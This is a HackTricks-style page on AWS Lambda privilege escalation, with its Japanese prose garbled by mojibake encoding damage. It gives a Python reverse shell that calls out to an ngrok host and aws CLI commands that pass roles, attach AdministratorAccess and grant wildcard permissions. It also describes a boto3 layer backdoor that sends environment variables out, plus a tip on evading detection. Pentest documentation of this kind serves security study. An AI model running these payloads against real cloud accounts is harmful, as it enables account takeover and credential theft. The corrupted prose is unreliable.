# AWS - Lambdaç‰¹æ¨©æ˜‡æ ¼

<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å…¥æ‰‹ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## lambda

Lambdaã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`ã€`lambda:CreateFunction`**ã€ãŠã‚ˆã³**`lambda:InvokeFunction`**ã®æ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€æ—¢å­˜ã®IAMãƒ­ãƒ¼ãƒ«ã‚’æ–°ã—ã„Lambdaé–¢æ•°ã«æ¸¡ã™ã“ã¨ã§ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚é–¢é€£ã™ã‚‹AWSãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’é¸æŠã—ãŸãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªã«ã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’å«ã‚ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦ä»»æ„ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®ã‚³ãƒ¼ãƒ‰ã¯ã€AWS APIã‚’ä»‹ã—ã¦é–¢æ•°ã‚’å‘¼ã³å‡ºã™ã“ã¨ã§å®Ÿè¡Œã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦**ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å–å¾—ã—ã€ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ï¼š

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
ã‚ãªãŸã¯ã€Lambdaé–¢æ•°è‡ªä½“ã‹ã‚‰Lambdaãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
Lambdaãƒ­ãƒ¼ãƒ«ã«ååˆ†ãªæ¨©é™ãŒã‚ã‚‹å ´åˆã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦ç®¡ç†è€…æ¨©é™ã‚’è‡ªåˆ†ã«ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
**æ½œåœ¨çš„ãªå½±éŸ¿:** æŒ‡å®šã•ã‚ŒãŸä»»æ„ã®Lambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥ã®ç‰¹æ¨©æ˜‡æ ¼ã€‚

{% hint style="danger" %}
æ³¨æ„ã—ã¦ãã ã•ã„ã€èˆˆå‘³æ·±ã„ã‚ˆã†ã«è¦‹ãˆã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€**`lambda:InvokeAsync`** ã ã‘ã§ã¯ **`aws lambda invoke-async` ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚`lambda:InvokeFunction` ã‚‚å¿…è¦ã§ã™ã€‚
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

å‰ã®ã‚·ãƒŠãƒªã‚ªã¨åŒæ§˜ã«ã€**`lambda:AddPermission`** ã®æ¨©é™ãŒã‚ã‚Œã°ã€è‡ªåˆ†è‡ªèº«ã« **`lambda:InvokeFunction`** ã®æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**æ½œåœ¨çš„ãªå½±éŸ¿:** æŒ‡å®šã•ã‚ŒãŸä»»æ„ã®Lambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥ã®ç‰¹æ¨©æ˜‡æ ¼ã€‚

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`ã€`lambda:CreateFunction`ã€`lambda:CreateEventSourceMapping`**ï¼ˆãŠã‚ˆã³ãŠãã‚‰ã`dynamodb:PutItem`ã¨`dynamodb:CreateTable`ï¼‰ã®æ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€**`lambda:InvokeFunction`ã®æ¨©é™ã‚’æŒãŸãªã„**å ´åˆã§ã‚‚ã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€æ—¢å­˜ã®IAMãƒ­ãƒ¼ãƒ«ã‚’æ–°ã—ã„Lambdaé–¢æ•°ã«**æ¸¡ã™ã“ã¨**ã§å®Ÿç¾ã•ã‚Œã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€é–¢é€£ã™ã‚‹AWSãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’è‡ªåˆ†ã®é¸ã‚“ã ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªã«ã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’å«ã‚ãŸLambdaé–¢æ•°ã‚’ä½œæˆã—ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦ä»»æ„ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ãã®å¾Œã€**DynamoDBãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ä½œæˆã™ã‚‹ã‹æ—¢å­˜ã®ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ä½¿ç”¨**ã—ã¦ã€Lambdaé–¢æ•°ã«ãã®DynamoDBãƒ†ãƒ¼ãƒ–ãƒ«ã‚’æŒ‡ã™ã‚¤ãƒ™ãƒ³ãƒˆã‚½ãƒ¼ã‚¹ãƒãƒƒãƒ”ãƒ³ã‚°ã‚’ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã®å¾Œã€ãƒ†ãƒ¼ãƒ–ãƒ«ã«ã‚¢ã‚¤ãƒ†ãƒ ã‚’è¿½åŠ ã™ã‚‹ã‹ã€åˆ¥ã®æ–¹æ³•ã§ãƒ†ãƒ¼ãƒ–ãƒ«ã«ã‚¢ã‚¤ãƒ†ãƒ ãŒè¿½åŠ ã•ã‚Œã‚‹ã®ã‚’å¾…ã¤å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã†ã™ã‚‹ã“ã¨ã§ã€**Lambdaé–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã¾ã™**ã€‚
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
**ã‚³ãƒ¼ãƒ‰**ã¯ã€Pythonãƒ•ã‚¡ã‚¤ãƒ«å†…ã§**å¯¾è±¡ã®ãƒ­ãƒ¼ãƒ«ã‚’åˆ©ç”¨**ã™ã‚‹ã“ã¨ã«ãªã‚Šã¾ã™ã€‚å‰ã®æ–¹æ³•ã§ä½¿ç”¨ã•ã‚ŒãŸã‚¹ã‚¯ãƒªãƒ—ãƒˆã¨åŒã˜ä¾‹ã§ã™ã€‚

ãã®å¾Œã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€ç¾åœ¨ã®AWSç’°å¢ƒã§DynamoDBãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã«ã‚ˆã£ã¦ç•°ãªã‚Šã¾ã™ã€‚ã‚‚ã—DynamoDBãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã¯ã€Lambdaé–¢æ•°ã®ãŸã‚ã«**ã‚¤ãƒ™ãƒ³ãƒˆã‚½ãƒ¼ã‚¹ãƒãƒƒãƒ”ãƒ³ã‚°ã‚’ä½œæˆ**ã™ã‚‹ã ã‘ã§æ¸ˆã¿ã¾ã™ã€‚ã—ã‹ã—ã€ä½¿ç”¨ã•ã‚Œã¦ã„ãªã„å ´åˆã¯ã€æ”»æ’ƒè€…ã¯ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã§**ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ãŒæœ‰åŠ¹ãªãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
ã“ã®ã‚³ãƒãƒ³ãƒ‰ã®å¾Œã€æ”»æ’ƒè€…ã¯æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€Lambdaé–¢æ•°ã¨DynamoDBãƒ†ãƒ¼ãƒ–ãƒ«ã‚’**ã‚¤ãƒ™ãƒ³ãƒˆã‚½ãƒ¼ã‚¹ãƒãƒƒãƒ”ãƒ³ã‚°ã‚’ä½œæˆ**ã—ã¦**æ¥ç¶š**ã—ã¾ã™ã€‚
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
ä»Šã€Lambdaé–¢æ•°ã¨ã‚¹ãƒˆãƒªãƒ¼ãƒ ãŒæ¥ç¶šã•ã‚Œã¦ã„ã‚‹ã®ã§ã€æ”»æ’ƒè€…ã¯DynamoDBã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¦Lambdaé–¢æ•°ã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦DynamoDBãƒ†ãƒ¼ãƒ–ãƒ«ã«ã‚¢ã‚¤ãƒ†ãƒ ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§è¡Œã‚ã‚Œã¾ã™ã€‚
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
ã“ã®æ™‚ç‚¹ã§ã€Lambdaé–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã€æ”»æ’ƒè€…ã¯AWSã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ç®¡ç†è€…ã«ãªã‚Šã¾ã™ã€‚

**æ½œåœ¨çš„ãªå½±éŸ¿:** æŒ‡å®šã•ã‚ŒãŸLambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥ç‰¹æ¨©æ˜‡æ ¼ã€‚

### `lambda:AddPermission`

ã“ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**è‡ªåˆ†è‡ªèº«ï¼ˆã¾ãŸã¯ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼‰ã«ä»»æ„ã®æ¨©é™ã‚’ä»˜ä¸**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã“ã‚Œã«ã‚ˆã‚Šã€ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ãŸã‚ã®ãƒªã‚½ãƒ¼ã‚¹ãƒ™ãƒ¼ã‚¹ã®ãƒãƒªã‚·ãƒ¼ãŒç”Ÿæˆã•ã‚Œã¾ã™ï¼‰ï¼š

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**æ½œåœ¨çš„ãªå½±éŸ¿:** ã‚³ãƒ¼ãƒ‰ã®å¤‰æ›´ã¨å®Ÿè¡Œã®è¨±å¯ã‚’ä¸ãˆã‚‹ã“ã¨ã§ã€Lambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥çš„ãªç‰¹æ¨©æ˜‡æ ¼ãŒå¯èƒ½ã¨ãªã‚Šã¾ã™ã€‚

### `lambda:AddLayerVersionPermission`

ã“ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€è‡ªåˆ†è‡ªèº«ï¼ˆã¾ãŸã¯ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼‰ã«`lambda:GetLayerVersion`ã®æ¨©é™ã‚’ä¸ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚å½¼ã¯ãƒ¬ã‚¤ãƒ¤ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€è„†å¼±æ€§ã‚„æ©Ÿå¯†æƒ…å ±ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**æ½œåœ¨çš„ãªå½±éŸ¿:** æ©Ÿå¯†æƒ…å ±ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã®å¯èƒ½æ€§ã€‚

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**IAMãƒ­ãƒ¼ãƒ«ãŒã‚¢ã‚¿ãƒƒãƒã•ã‚ŒãŸæ—¢å­˜ã®Lambdaé–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ã‚’æ›´æ–°**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã‚Œã«ã‚ˆã‚Šã€é–¢æ•°ã¯è©²å½“ã™ã‚‹AWSãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã€ãã®å½¹å‰²ã‚’ä»£è¡¨ã—ã¦ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€**ç›´æ¥å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ããªã„å ´åˆã¯ã€é–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã®ã‚’å¾…ã¤å¿…è¦ãŒã‚ã‚Šã¾ã™**ãŒã€æ—¢ã«å­˜åœ¨ã—ã¦ã„ã‚‹å ´åˆã€å‘¼ã³å‡ºã•ã‚Œã‚‹æ–¹æ³•ãŒã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```bash
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not checki if it's exposed in any URL or via an API gateway you could access
```
é–¢é€£ã™ã‚‹**.zipãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€Lambdaã®å½¹å‰²ã‚’åˆ©ç”¨ã™ã‚‹ã‚³ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã¾ã™**ã€‚ä¾‹ã¨ã—ã¦ã€ä»¥å‰ã®æ–¹æ³•ã®ã‚³ãƒ¼ãƒ‰ã‚¹ãƒ‹ãƒšãƒƒãƒˆãŒå«ã¾ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

**æ½œåœ¨çš„ãªå½±éŸ¿:** ä½¿ç”¨ã•ã‚Œã‚‹Lambdaã‚µãƒ¼ãƒ“ã‚¹ã®å½¹å‰²ã¸ã®ç›´æ¥ã®ç‰¹æ¨©æ˜‡æ ¼ã€‚

### `lambda:UpdateFunctionConfiguration`

#### æ¦‚è¦

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html)ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**ã‚³ãƒ¼ãƒ‰ã‚’åˆ¥ã€…ã«ä¿å­˜**ã—ãªãŒã‚‰ã€Lambdaé–¢æ•°ã«**ã‚³ãƒ¼ãƒ‰ã‚’å«ã‚ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®ãŸã‚ã€é–¢æ•°ã‚³ãƒ¼ãƒ‰ã‚’å°ã•ãä¿ã¡ãªãŒã‚‰ã€**è¤‡æ•°ã®é–¢æ•°ã§ã‚³ãƒ¼ãƒ‰ã‚’å…±æœ‰**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Lambdaå†…éƒ¨ã§ã¯ã€æ¬¡ã®ã‚ˆã†ãªé–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã€Pythonã‚³ãƒ¼ãƒ‰ãŒãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹ãƒ‘ã‚¹ã‚’ç¢ºèªã§ãã¾ã™ã€‚
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
ã“ã‚Œã‚‰ã¯å ´æ‰€ã§ã™ï¼š

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

ãŸã¨ãˆã°ã€ãƒ©ã‚¤ãƒ–ãƒ©ãƒªboto3ã¯`/var/runtime/boto3`ï¼ˆ4ç•ªç›®ã®ä½ç½®ï¼‰ã‹ã‚‰ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¾ã™ã€‚

#### æ‚ªç”¨

**é–¢æ•°ã«ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’ã‚¢ã‚¿ãƒƒãƒã™ã‚‹**ã«ã¯ã€`lambda:UpdateFunctionConfiguration`ã®æ¨©é™ã®ã¿ãŒå¿…è¦ã§ã‚ã‚Šã€**ãƒ¬ã‚¤ãƒ¤ãƒ¼ã¯ã‚¯ãƒ­ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§å…±æœ‰ã§ãã¾ã™**ã€‚ã¾ãŸã€**ã©ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹**ã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã®ã§ã€æ­£ã—ãä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€ã“ã®ä¾‹ã§ã¯ã€æ”»æ’ƒå¯¾è±¡ã®é–¢æ•°ãŒboto3ã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã¦ã„ã‚‹ã¨ä»®å®šã—ã¾ã™ã€‚

å®‰å…¨ã®ãŸã‚ã«ã€Lambdaãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã‹ã‚‰ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã¨ã—ã¦ã„ã‚‹boto3ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¨åŒã˜ãƒãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆPython 3.7ï¼‰ã‚’Pipã‚’ä½¿ç”¨ã—ã¦ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆé–¢æ•°ã§å•é¡ŒãŒç™ºç”Ÿã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ç•°ãªã‚‹è¦ç´ ãŒãªã„ã‚ˆã†ã«ã—ã¾ã™ã€‚ç¾åœ¨ã®ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã§ã¯ã€boto3ãƒãƒ¼ã‚¸ãƒ§ãƒ³1.9.42ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚

æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã§ã€boto3ãƒãƒ¼ã‚¸ãƒ§ãƒ³1.9.42ã¨ãã®ä¾å­˜é–¢ä¿‚ã‚’ãƒ­ãƒ¼ã‚«ãƒ«ã®ã€Œlambda\_layerã€ãƒ•ã‚©ãƒ«ãƒ€ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ï¼š
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
æ¬¡ã«ã€`/lambda_layer/boto3/__init__.py`ã‚’é–‹ãã€æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’è¿½åŠ ã—ã¾ã™ã€‚è¿½åŠ ã™ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š

![](<../../../.gitbook/assets/image (26).png>)

`requests`ã¯`botocore`ã‹ã‚‰ã‚¤ãƒ³ãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®é–¢æ•°ã¯ç’°å¢ƒå¤‰æ•°ã‚’å¤–éƒ¨ã«æµå‡ºã•ã›ã¾ã™ãŒã€try-exceptã¨0.1ç§’ã®ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã¯ã€ã“ã®ã‚³ãƒ¼ãƒ‰ãŒä½•ã‚‚å£Šã‚Œãªã„ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã«ã‚ã‚Šã¾ã™ã€‚

{% hint style="info" %}
**é‡è¦ãªæ³¨æ„ç‚¹ï¼š**å®Ÿéš›ã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆã§ã¯ã€ã‚‚ã¯ã‚„`botocore.vendored`ã‹ã‚‰`requests`ã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ãªã„ã§ãã ã•ã„ã€‚ãªãœãªã‚‰ã€ãã®é–¢æ•°ã®CloudWatchãƒ­ã‚°ã«ã€ŒDeprecationWarningã€ãŒè¡¨ç¤ºã•ã‚Œã€ãã‚Œã«ã‚ˆã£ã¦é˜²å¾¡å´ã«ç™ºè¦‹ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒé«˜ããªã‚‹ã‹ã‚‰ã§ã™ã€‚
{% endhint %}

ãã‚Œã§ã¯ã€ãã®ã‚³ãƒ¼ãƒ‰ã‚’**ZIPãƒ•ã‚¡ã‚¤ãƒ«**ã«ã¾ã¨ã‚ã€ãã‚Œã‚’**æ”»æ’ƒè€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®æ–°ã—ã„Lambdaãƒ¬ã‚¤ãƒ¤ãƒ¼ã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã—ã¾ã™ã€‚ã¾ãšã€ã€Œpythonã€ã¨ã„ã†ãƒ•ã‚©ãƒ«ãƒ€ã‚’ä½œæˆã—ã€ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ãã“ã«é…ç½®ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€Lambdaã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ãŸå¾Œã€ã‚³ãƒ¼ãƒ‰ã¯ã€Œ/opt/python/boto3ã€ã§è¦‹ã¤ã‹ã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚ã¾ãŸã€ãƒ¬ã‚¤ãƒ¤ãƒ¼ãŒPython 3.7ã¨äº’æ›æ€§ãŒã‚ã‚Šã€**ãƒ¬ã‚¤ãƒ¤ãƒ¼ãŒå¯¾è±¡ã®é–¢æ•°ã¨åŒã˜ãƒªãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚ã‚‹ã“ã¨ã‚’ç¢ºèª**ã—ã¦ãã ã•ã„ã€‚ãã‚ŒãŒå®Œäº†ã—ãŸã‚‰ã€`lambda:AddLayerVersionPermission`ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’**ãƒ‘ãƒ–ãƒªãƒƒã‚¯ã«ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½**ã«ã—ã¾ã™ã€‚ã“ã®APIå‘¼ã³å‡ºã—ã«ã¯ã€å€‹äººã®AWSèªè¨¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
